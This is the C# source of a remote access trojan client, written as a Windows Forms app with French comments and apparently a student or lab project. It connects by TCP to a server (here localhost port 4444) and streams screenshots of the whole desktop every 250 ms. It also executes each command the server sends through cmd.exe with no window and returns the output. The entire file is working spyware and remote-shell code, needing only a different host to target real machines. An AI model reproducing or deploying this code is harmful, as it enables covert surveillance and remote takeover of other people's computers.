using System;
using System.Diagnostics;  // Pour exécuter des commandes système
using System.ComponentModel;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using System.Text;
using Global;

namespace RATWinFormApp1
{
    class RATClient : Form
    {
        private Label terminal;
        TcpClient client = null;
        NetworkStream stream = null;
        private Panel controller;
        bool errFound = false;

        //int jack = 1;

        public RATClient()
        {
            InitializeComponent();

            //ajout des evenement
            this.FormClosing += new FormClosingEventHandler(OnFormClosing);
            this.Load += BackgroundTask;
        }

        /// <summary>
        /// tache fait en arriere plans permetant d'afficher la fenetre avant la fin
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void BackgroundTask(object sender, EventArgs e)
        {
            BackgroundWorker worker = new BackgroundWorker(); //permet d'exécuter des tâches en arrière-plan sans bloquer l'interface utilisateur
            worker.DoWork += (s, args) => StartClient();  //processus a lancer
            worker.RunWorkerAsync(); //lance le processus
        }

        /// <summary>
        /// lance le client
        /// </summary>
        public void StartClient()
        {
            terminal.Text = "Tentative connection au serveur !\n";
            try
            {
                client = new TcpClient("127.0.0.1", 4444); //client pour se co au server
                stream = client.GetStream(); //recup le flux de donne
                terminal.Text += "Connecté au serveur !\n";
            }catch (Exception err)
            {
                terminal.Text += "Erreur : " + err.Message + "\n";
                errFound = true;
            }
            while (!errFound)
            {
                try
                {
                    
                    // Démarrer un thread pour l'envoi de captures d'écran
                    Thread screenThread = new Thread(SendScreen)
                    {
                        IsBackground = true //Ce thread sera tué automatiquement lorsque l'application se ferme.
                    };
                    screenThread.Start();
                    
                    // Démarrer un thread pour écouter les commandes du serveur
                    Thread commandThread = new Thread(ListenForCommands)
                    {
                        IsBackground = true
                    };
                    commandThread.Start();

                    while (true) { } // Garde l'application en cours d'exécution
                }
                catch (Exception ex)
                {
                    terminal.Text += "Erreur : " + ex.Message + "\n";
                    break;
                }
            }

            /*if (client != null)
            {
                client.Close();
            }*/
            client?.Close();
        }

        /// <summary>
        /// envoie l'ecran au server
        /// </summary>
        void SendScreen()
        {
            while (true)
            {
                try
                {
                    Bitmap screenshot = CaptScreen();

                    using (MemoryStream ms = new MemoryStream())
                    {
                        screenshot.Save(ms, ImageFormat.Jpeg); //sauvegarde l'image en memoire
                        byte[] imageData = ms.ToArray(); //converti l'image en tableau sous forme binaire

                        Fonction.SendPrefix(Fonction.Prefix.IMG, stream);

                        Fonction.SendSize(imageData, stream);

                        // Envoyer l'image
                        stream.Write(imageData, 0, imageData.Length);
                    }

                    Thread.Sleep(250); // Envoie une capture avec un delay (1000 -> 1 seconde)
                }
                catch (Exception ex)
                {
                    Console.WriteLine("Erreur envoi écran : " + ex.Message);
                }
            }
        }
        
        /// <summary>
        /// capture l'ecran
        /// </summary>
        /// <returns>renvoie l'ecran</returns>
        Bitmap CaptScreen()
        {
            Rectangle bounds = SystemInformation.VirtualScreen;
            Bitmap bmp = new Bitmap(bounds.Width, bounds.Height);
            /*if(jack == 1)
            {
                Rectangle bounds = SystemInformation.VirtualScreen;
                label1.Text = "w:" + Screen.PrimaryScreen.Bounds.Width + "h:" + Screen.PrimaryScreen.Bounds.Height + "\n";
                label1.Text += "w:" + bounds.Width + "h:" + bounds.Height + "\n";
                using (Graphics g = Graphics.FromHwnd(IntPtr.Zero))
                {
                    float dpiX = g.DpiX; // DPI horizontal
                    float dpiY = g.DpiY; // DPI vertical

                    int screenWidth = (int)(Screen.PrimaryScreen.Bounds.Width * (dpiX / 96.0));
                    int screenHeight = (int)(Screen.PrimaryScreen.Bounds.Height * (dpiY / 96.0));
                    label1.Text += "w:" + screenWidth + "h:" + screenHeight + "\n";
                }
            }*/
            Graphics gfx = Graphics.FromImage(bmp);
            gfx.CopyFromScreen(0, 0, 0, 0, bmp.Size);
            return bmp;
        }

        /// <summary>
        /// ecoute les command du server
        /// </summary>
        void ListenForCommands()
        {
            while (client.Connected)
            {
                try
                {
                    byte[] sizeBuffer = new byte[4];
                    int sizeRead = stream.Read(sizeBuffer, 0, sizeBuffer.Length); //lit la taille
                    int size = BitConverter.ToInt32(sizeBuffer, 0);  // Conversion de la taille en entier

                    byte[] buffer = new byte[size];
                    int bytesRead = stream.Read(buffer, 0, buffer.Length); //lit la commande

                    string command = Encoding.UTF8.GetString(buffer, 0, bytesRead); // Convertit le tableau de bytes en une chaîne de caractères

                    terminal.Text += "Commande reçue : " + command + "\n"; // Affiche la commande reçue dans l'interface utilisateur

                    string output = ExecuteCommand(command); //execute la commande

                    Fonction.SendPrefix(Fonction.Prefix.CMD, stream); //envoie le prefix au server

                    byte[] data = Encoding.UTF8.GetBytes(output); // Crée un tableau de bytes pour encoder la réponse du terminal

                    Fonction.SendSize(data, stream); //envoie la taille

                    stream.Write(data, 0, data.Length); //envoie la reponse
                    stream.Flush();
                    terminal.Text += $"out: {output}";
                }
                catch (Exception ex)
                {
                    terminal.Text += "Erreur réception commande : " + ex.Message + "\n";
                }
            }
            client?.Close();
            Environment.Exit(0);
        }

        /// <summary>
        /// execute une commande
        /// </summary>
        /// <param name="command">la commande a executer</param>
        /// <returns>la reponse ou l'erreur</returns>
        string ExecuteCommand(string command)
        {
            try
            {
                // Crée une nouvelle instance de la classe ProcessStartInfo, qui est utilisée pour configurer et démarrer un processus.
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "cmd.exe", //nom du fichier a executer
                    Arguments = "/C " + command,  // "/C" exécute la commande et ferme immédiatement
                    RedirectStandardOutput = true, // Redirige la sortie standard du processus pour pouvoir lire ce que la commande affiche dans la console.
                    RedirectStandardError = true, // Redirige la sortie d'erreur du processus pour pouvoir lire les messages d'erreur de la commande.
                    UseShellExecute = false, // ne pas utiliser l'environement shell
                    CreateNoWindow = true //ne cree pas de fenetre
                };
                //creez un nouveau procces avec la config
                Process process = new Process { StartInfo = psi };
                process.Start(); //lance le processus

                string output = process.StandardOutput.ReadToEnd(); //recupere la sortie standat
                string error = process.StandardError.ReadToEnd(); //recupere la sortie d'erreur

                return string.IsNullOrEmpty(error) ? output : error;
            }
            catch (Exception ex)
            {
                return "Erreur exécution : " + ex.Message;
            }
        }




        /// <summary>
        /// init tout les composant modifier par vs lui meme donc faire gaff
        /// </summary>
        private void InitializeComponent()
        {
            this.terminal = new System.Windows.Forms.Label();
            this.controller = new System.Windows.Forms.Panel();
            this.controller.SuspendLayout();
            this.SuspendLayout();
            // 
            // terminal
            // 
            this.terminal.AutoSize = true;
            this.terminal.Location = new System.Drawing.Point(3, 0);
            this.terminal.Name = "terminal";
            this.terminal.Size = new System.Drawing.Size(88, 25);
            this.terminal.TabIndex = 0;
            this.terminal.Text = "terminal";
            // 
            // controller
            // 
            this.controller.AutoScroll = true;
            this.controller.Controls.Add(this.terminal);
            this.controller.Dock = System.Windows.Forms.DockStyle.Fill;
            this.controller.Location = new System.Drawing.Point(0, 0);
            this.controller.Name = "controller";
            this.controller.Size = new System.Drawing.Size(874, 529);
            this.controller.TabIndex = 1;
            // 
            // RATClient
            // 
            this.ClientSize = new System.Drawing.Size(874, 529);
            this.Controls.Add(this.controller);
            this.Name = "RATClient";
            this.Text = "Client";
            this.controller.ResumeLayout(false);
            this.controller.PerformLayout();
            this.ResumeLayout(false);

        }

        /// <summary>
        /// appeler a la fermeture de la fenetre
        /// </summary>
        /// <param name="sender">object qui a declencher l'event</param>
        /// <param name="e">information lieu a l'event</param>
        private void OnFormClosing(object sender, FormClosingEventArgs e)
        {
            Console.WriteLine("Fermeture du serveur...");

            client?.Close();

            Environment.Exit(0); // Forcer la fermeture complète
        }

    }
}